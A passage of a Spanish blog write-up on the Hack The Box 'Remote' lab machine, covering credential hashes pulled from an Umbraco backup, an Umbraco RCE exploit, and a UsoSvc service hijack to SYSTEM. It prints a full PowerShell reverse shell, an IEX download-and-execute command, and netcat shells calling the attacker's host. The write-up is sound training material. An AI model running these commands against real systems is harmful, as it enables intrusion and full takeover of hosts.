+drwx------ 2 nobody   4294967294    64 Feb 20  2020 scripts
+drwx------ 2 nobody   4294967294  8192 Feb 20  2020 Umbraco
+drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Umbraco_Client
+drwx------ 2 nobody   4294967294  4096 Feb 20  2020 Views
+<span class="nt">-rwx------</span> 1 nobody   4294967294 28539 Feb 20  2020 Web.config
+</code></pre></div></div>
+<p>Por suerte, se está compartiendo un backup del sitio Web, por lo que tras googlear un poco dónde se quedan guardadas las credenciales de <em>Umbraco</em>, encontramos el archivo <em>Umbraco.sdf</em> en el directorio <em>App_Data</em> . Al inspeccionar este archivo nos muestra que contiene “<em>data</em>”. Se trata de un archivo que contiene la base de datos. Al hacerle un simple <em>cat</em> se muestran carácteres extraños. Se podría usar algún programa para tratar de visualizar el contenido, pero antes de estar utilizando programas, intento ir de más simple a más complejo, así que le hago un <em>strings</em> para comprobar qué se puede sacar en claro de este archivo.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jagelito ~<span class="nv">$ </span>file Umbraco.sdf 
+Umbraco.sdf: data
+
+jagelito ~<span class="nv">$ </span>strings Umbraco.sdf | <span class="nb">head
+</span>Administratoradmindefaulten-US
+Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="o">{</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"SHA1"</span><span class="o">}</span>en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="o">{</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"SHA1"</span><span class="o">}</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="o">{</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"SHA1"</span><span class="o">}</span>admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span class="o">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span class="o">={</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"HMACSHA256"</span><span class="o">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
+ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw<span class="o">==</span>AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts<span class="o">={</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"HMACSHA256"</span><span class="o">}</span>smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
+ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg<span class="o">==</span><span class="nv">RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA</span><span class="o">={</span><span class="s2">"hashAlgorithm"</span>:<span class="s2">"HMACSHA256"</span><span class="o">}</span>ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+@<span class="o">{</span>pv
+qpkaj
+</code></pre></div></div>
+<p>Encontramos que aparecen dos usuarios con lo que parecen dos contraseñas hasheadas.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Usuario</th>
+      <th>Hash</th>
+      <th>Contraseña</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>admin@htb.local</td>
+      <td>b8be16afba8c314ad33d812f22a04991b90e2aaa</td>
+      <td>baconandcheese</td>
+    </tr>
+    <tr>
+      <td>smith@htb.local</td>
+      <td>ljxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts=</td>
+      <td>N/A</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+<h1 id="explotación">Explotación</h1>
+<h2 id="umbraco-cms">Umbraco CMS</h2>
+<p>Una vez que tenemos un usuario y una contraseña en texto claro, pruebo a acceder a Umbraco y conseguimos loguearnos como administrator. Conseguimos saber qué versión está corriendo.
+<img src="/assets/images/ctf-writeups/htb/remote/admin_good.png" alt="image-center" class="align-center" /></p>
+
+<p>Una vez sabemos la versión, buscamos exploits disponibles de manera local para tratar de conseguir RCE. Nos creamos un mirror del exploit y le pasamos los parámetros que nos pide.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jagelito ~<span class="nv">$ </span>searchsploit Umbraco 7.12.4
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                                                                              |  Path
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Umbraco CMS 7.12.4 - <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution                                                                                                  | aspx/webapps/46153.py
+Umbraco CMS 7.12.4 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span>                                                                                                  | aspx/webapps/49488.py
+<span class="nt">------------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">-------------------------------</span>
+
+jagelito ~<span class="nv">$ </span>python 49488.py <span class="nt">-u</span> admin@htb.local <span class="nt">-p</span> baconandcheese <span class="nt">-i</span> http://remote.htb <span class="nt">-c</span> <span class="nb">whoami
+</span>iis apppool<span class="se">\d</span>efaultapppool
+</code></pre></div></div>
+<p>Tenemos RCE dentro de la máquina, así que ahora se trata de conseguir una shell en ella. Creamos una reverse shell y abrimos un servidor http con python para poder transferirla a la máquina
+Para crear nuestra reverse shell uso este script:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"10.10.10.10"</span><span class="p">,</span><span class="mi">80</span><span class="p">);</span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">();[</span><span class="n">byte</span><span class="p">[]]</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="o">..</span><span class="mi">65535</span><span class="o">|%</span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="kr">while</span><span class="p">((</span><span class="nv">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$bytes</span><span class="o">.</span><span class="nf">Length</span><span class="p">))</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){;</span><span class="nv">$data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-TypeName</span><span class="w"> </span><span class="nx">System.Text.ASCIIEncoding</span><span class="p">)</span><span class="o">.</span><span class="nf">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">iex</span><span class="w"> </span><span class="nv">$data</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="o">&amp;</span><span class="nx">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Out-String</span><span class="w"> </span><span class="p">);</span><span class="nv">$sendback2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$sendback</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"PS "</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">pwd</span><span class="p">)</span><span class="o">.</span><span class="nf">Path</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="p">;</span><span class="nv">$sendbyte</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="n">text.encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">)</span><span class="o">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="nx">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="o">.</span><span class="nf">Close</span><span class="p">()</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jagelito ~<span class="nv">$ </span>python 49488.py <span class="nt">-u</span> admin@htb.local <span class="nt">-p</span> baconandcheese <span class="nt">-i</span> http://remote.htb <span class="nt">-c</span> powershell.exe <span class="nt">-a</span> <span class="s2">"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.12:8000/rev.ps1')"</span>
+
+jagelito ~<span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+10.10.10.180 - - <span class="o">[</span>12/Jul/2021 12:23:26] <span class="s2">"GET /rev.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+<p>Una vez transferida la shell a la máquina victima, abrimos el puerto a la escucha con netcat</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jagelito ~<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvnp</span> 443
+connect to <span class="o">[</span>10.10.14.12] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.180] 49709
+PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">whoami
+</span>iis apppool<span class="se">\d</span>efaultapppool
+</code></pre></div></div>
+<hr />
+<h1 id="priv-esc">Priv. Esc.</h1>
+<h3 id="usertxt">user.txt</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\windows\system32\inetsrv</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">Users</span><span class="w">
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">
+
+
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users</span><span class="w">
+
+
+</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                  
+</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                  
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">2/19/2020</span><span class="w">   </span><span class="nx">3:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="o">.</span><span class="nf">NET</span><span class="w"> </span><span class="nx">v2.0</span><span class="w">                                                             
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">2/19/2020</span><span class="w">   </span><span class="nx">3:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="o">.</span><span class="nf">NET</span><span class="w"> </span><span class="nx">v2.0</span><span class="w"> </span><span class="nx">Classic</span><span class="w">                                                     
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">2/19/2020</span><span class="w">   </span><span class="nx">3:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="o">.</span><span class="nf">NET</span><span class="w"> </span><span class="nx">v4.5</span><span class="w">                                                             
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">2/19/2020</span><span class="w">   </span><span class="nx">3:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="o">.</span><span class="nf">NET</span><span class="w"> </span><span class="nx">v4.5</span><span class="w"> </span><span class="nx">Classic</span><span class="w">                                                     
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">7/11/2021</span><span class="w">   </span><span class="nx">7:07</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Administrator</span><span class="w">                                                         
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">2/19/2020</span><span class="w">   </span><span class="nx">3:12</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Classic</span><span class="w"> </span><span class="o">.</span><span class="nf">NET</span><span class="w"> </span><span class="nx">AppPool</span><span class="w">                                                  
+</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">2/20/2020</span><span class="w">   </span><span class="nx">2:42</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Public</span><span class="w">                                                                
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">Public</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">
+    </span><span class="n">Directory:</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="w">
+
+
+</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">                                                                  
+</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">                                                                  
+</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">2/19/2020</span><span class="w">   </span><span class="nx">3:03</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">Documents</span><span class="w">                                                             
+</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">9/15/2018</span><span class="w">   </span><span class="nx">3:19</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Downloads</span><span class="w">                                                             
+</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">9/15/2018</span><span class="w">   </span><span class="nx">3:19</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Music</span><span class="w">                                                                 
+</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">9/15/2018</span><span class="w">   </span><span class="nx">3:19</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Pictures</span><span class="w">                                                              
+</span><span class="n">d-r---</span><span class="w">        </span><span class="nx">9/15/2018</span><span class="w">   </span><span class="nx">3:19</span><span class="w"> </span><span class="nx">AM</span><span class="w">                </span><span class="nx">Videos</span><span class="w">                                                                
+</span><span class="nt">-ar</span><span class="o">---</span><span class="w">        </span><span class="mi">7</span><span class="n">/11/2021</span><span class="w">   </span><span class="nx">7:07</span><span class="w"> </span><span class="nx">PM</span><span class="w">             </span><span class="nx">34</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">                                                              
+
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">user.txt</span><span class="w">
+</span><span class="n">b200d........................</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="iis---administrator">IIS -&gt; Administrator</h3>
+<p>Comecemos con una enumeración del sistema con winPEAS. Nos lo transferimos a la máquina y lo ejecutamos.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w"> </span><span class="nx">/priv</span><span class="w">
+
+</span><span class="n">PRIVILEGES</span><span class="w"> </span><span class="nx">INFORMATION</span><span class="w">
+</span><span class="o">----------------------</span><span class="w">
+
+</span><span class="n">Privilege</span><span class="w"> </span><span class="nx">Name</span><span class="w">                </span><span class="nx">Description</span><span class="w">                               </span><span class="nx">State</span><span class="w">   
+</span><span class="o">=============================</span><span class="w"> </span><span class="o">=========================================</span><span class="w"> </span><span class="o">========</span><span class="w">
+</span><span class="n">SeAssignPrimaryTokenPrivilege</span><span class="w"> </span><span class="nx">Replace</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">level</span><span class="w"> </span><span class="nx">token</span><span class="w">             </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeIncreaseQuotaPrivilege</span><span class="w">      </span><span class="nx">Adjust</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">quotas</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w">        </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeAuditPrivilege</span><span class="w">              </span><span class="nx">Generate</span><span class="w"> </span><span class="nx">security</span><span class="w"> </span><span class="nx">audits</span><span class="w">                  </span><span class="nx">Disabled</span><span class="w">
+</span><span class="n">SeChangeNotifyPrivilege</span><span class="w">       </span><span class="nx">Bypass</span><span class="w"> </span><span class="nx">traverse</span><span class="w"> </span><span class="nx">checking</span><span class="w">                  </span><span class="nx">Enabled</span><span class="w"> 
+</span><span class="n">SeImpersonatePrivilege</span><span class="w">        </span><span class="nx">Impersonate</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">client</span><span class="w"> </span><span class="nx">after</span><span class="w"> </span><span class="nx">authentication</span><span class="w"> </span><span class="nx">Enabled</span><span class="w"> 
+</span><span class="n">SeCreateGlobalPrivilege</span><span class="w">       </span><span class="nx">Create</span><span class="w"> </span><span class="nx">global</span><span class="w"> </span><span class="nx">objects</span><span class="w">                     </span><span class="nx">Enabled</span><span class="w"> 
+</span><span class="n">SeIncreaseWorkingSetPrivilege</span><span class="w"> </span><span class="nx">Increase</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">process</span><span class="w"> </span><span class="nx">working</span><span class="w"> </span><span class="nx">set</span><span class="w">            </span><span class="nx">Disabled</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Public</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:/Windows/TEMP</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:/Windows/TEMP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://10.10.14.12:8000/winPEASx64.exe</span><span class="w"> </span><span class="nt">-Outfile</span><span class="w"> </span><span class="nx">win.exe</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:/Windows/TEMP</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">/win.exe</span><span class="w">
+</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="w">
+
+  </span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Modifiable</span><span class="w"> </span><span class="nx">Services</span><span class="w">                                                                                                                                                                   
+   </span><span class="p">[</span><span class="nf">?</span><span class="p">]</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="n">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="n">//book.hacktricks.xyz/windows/windows-local-privilege-escalation</span><span class="c">#services                                                                   </span><span class="w">
+    </span><span class="n">LOOKS</span><span class="w"> </span><span class="n">LIKE</span><span class="w"> </span><span class="n">YOU</span><span class="w"> </span><span class="n">CAN</span><span class="w"> </span><span class="n">MODIFY</span><span class="w"> </span><span class="n">SOME</span><span class="w"> </span><span class="n">SERVICE/s:</span><span class="w">                                                                                                                                               
+    </span><span class="n">UsoSvc</span><span class="p">:</span><span class="w"> </span><span class="n">AllAccess</span><span class="p">,</span><span class="w"> </span><span class="n">Start</span><span class="w">  
+	
+</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Encontramos el servicio <em>UsoSvc</em>, siguiendo la guía de https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md, encontramos que podemos conseguir escalar al usuario Administrator con el CVE-2019-1322. Se trata de una incorrecta administración de permisos en un servicio corriendo bajo NT AUTHORITY/SYSTEM, permitiéndonos reemplazar el binario por netcat y así obtener una reverse como Administrador.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\TEMP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iwr</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nx">http://10.10.14.12:8000/nc64.exe</span><span class="w"> </span><span class="nt">-Outfile</span><span class="w"> </span><span class="nx">nc.exe</span><span class="w"> 
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\TEMP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">UsoSvc</span><span class="w">
+                                                                                               
+</span><span class="n">SERVICE_NAME:</span><span class="w"> </span><span class="nx">UsoSvc</span><span class="w">                                                                           
+        </span><span class="kr">TYPE</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="mi">30</span><span class="w">  </span><span class="n">WIN32</span><span class="w">                                                         
+        </span><span class="n">STATE</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">3</span><span class="w">  </span><span class="nx">STOP_PENDING</span><span class="w">                                                   
+                                </span><span class="p">(</span><span class="n">NOT_STOPPABLE</span><span class="p">,</span><span class="w"> </span><span class="nx">NOT_PAUSABLE</span><span class="p">,</span><span class="w"> </span><span class="nx">IGNORES_SHUTDOWN</span><span class="p">)</span><span class="w">                
+        </span><span class="n">WIN32_EXIT_CODE</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="n">x0</span><span class="p">)</span><span class="w">                                                          
+        </span><span class="n">SERVICE_EXIT_CODE</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">  </span><span class="p">(</span><span class="mi">0</span><span class="n">x0</span><span class="p">)</span><span class="w">                                                          
+        </span><span class="n">CHECKPOINT</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">0x3</span><span class="w">                                                               
+        </span><span class="n">WAIT_HINT</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">0x7530</span><span class="w"> 
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\TEMP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">UsoSvc</span><span class="w"> </span><span class="nx">binpath</span><span class="o">=</span><span class="s2">"C:/Windows/TEMP/nc.exe 10.10.14.12 4444 -e cmd.exe"</span><span class="w"> 
+</span><span class="p">[</span><span class="n">SC</span><span class="p">]</span><span class="w"> </span><span class="n">ChangeServiceConfig</span><span class="w"> </span><span class="nx">SUCCESS</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\TEMP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">qc</span><span class="w"> </span><span class="nx">usosvc</span><span class="w">
+</span><span class="n">SERVICE_NAME:</span><span class="w"> </span><span class="nx">usosvc</span><span class="w">                                                                           
+        </span><span class="kr">TYPE</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="mi">20</span><span class="w">  </span><span class="n">WIN32_SHARE_PROCESS</span><span class="w">                                           
+        </span><span class="n">START_TYPE</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">2</span><span class="w">   </span><span class="nx">AUTO_START</span><span class="w">  </span><span class="p">(</span><span class="n">DELAYED</span><span class="p">)</span><span class="w">                                         
+        </span><span class="n">ERROR_CONTROL</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">   </span><span class="nx">NORMAL</span><span class="w">                                                        
+        </span><span class="n">BINARY_PATH_NAME</span><span class="w">   </span><span class="p">:</span><span class="w"> </span><span class="nx">C:/Windows/TEMP/nc.exe</span><span class="w"> </span><span class="nx">10.10.14.12</span><span class="w"> </span><span class="nx">4444</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">                  
+        </span><span class="n">LOAD_ORDER_GROUP</span><span class="w">   </span><span class="p">:</span><span class="w">                                                                   
+        </span><span class="n">TAG</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">                                                                 
+        </span><span class="n">DISPLAY_NAME</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">Update</span><span class="w"> </span><span class="nx">Orchestrator</span><span class="w"> </span><span class="nx">Service</span><span class="w">                                       
+        </span><span class="n">DEPENDENCIES</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">rpcss</span><span class="w">                                                             
+        </span><span class="n">SERVICE_START_NAME</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">LocalSystem</span><span class="w">  
+		
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\TEMP</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">UsoSvc</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>En otra terminal, ponemos un puerto a la escucha.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">jagelito</span><span class="w"> </span><span class="nx">~</span><span class="err">$</span><span class="w"> </span><span class="nx">sudo</span><span class="w"> </span><span class="nx">rlwrap</span><span class="w"> </span><span class="nx">nc</span><span class="w"> </span><span class="nt">-lvnp</span><span class="w"> </span><span class="nx">4444</span><span class="w">
+</span><span class="n">listening</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="p">[</span><span class="n">any</span><span class="p">]</span><span class="w"> </span><span class="nx">4444</span><span class="w"> </span><span class="o">...</span><span class="w">
+</span><span class="n">connect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="nf">14</span><span class="o">.</span><span class="nf">12</span><span class="p">]</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="p">(</span><span class="n">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="nf">10</span><span class="o">.</span><span class="nf">180</span><span class="p">]</span><span class="w"> </span><span class="mi">49870</span><span class="w">
+</span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="p">[</span><span class="n">Version</span><span class="w"> </span><span class="mf">10.0</span><span class="o">.</span><span class="nf">17763</span><span class="o">.</span><span class="nf">107</span><span class="p">]</span><span class="w">
+</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2018</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
+
+</span><span class="n">whoami</span><span class="w">
+</span><span class="nx">nt</span><span class="w"> </span><span class="nx">authority\system</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop\root.txt</span><span class="w">
+</span><span class="mi">386</span><span class="n">bd................</span><span class="w">
+</span></code></pre></div></div>
+<p>Máquina pwneada.</p>
+
+  </div>
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
